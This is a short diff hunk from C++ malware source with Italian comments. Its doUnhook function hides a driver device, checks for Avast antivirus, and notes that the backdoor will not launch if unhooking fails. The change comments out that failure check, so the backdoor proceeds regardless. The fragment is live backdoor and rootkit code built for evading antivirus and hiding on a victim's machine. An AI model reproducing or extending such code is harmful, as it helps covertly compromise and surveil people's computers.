@@ -871,8 +871,8 @@ BOOL doUnhook()
 		HideDevice dev_unhook(drv_path);
 		Sleep(500); //sleep paranoico
 		// se non ci riesce non lancia la backdoor
-		if (!dev_unhook.unhook_isdrv(DRIVER_NAME_W))
-			return FALSE;
+		//if (!dev_unhook.unhook_isdrv(DRIVER_NAME_W))
+			//return FALSE;
 
 		if (!IsAvast())
 			dev_unhook.unhook_all(FALSE);
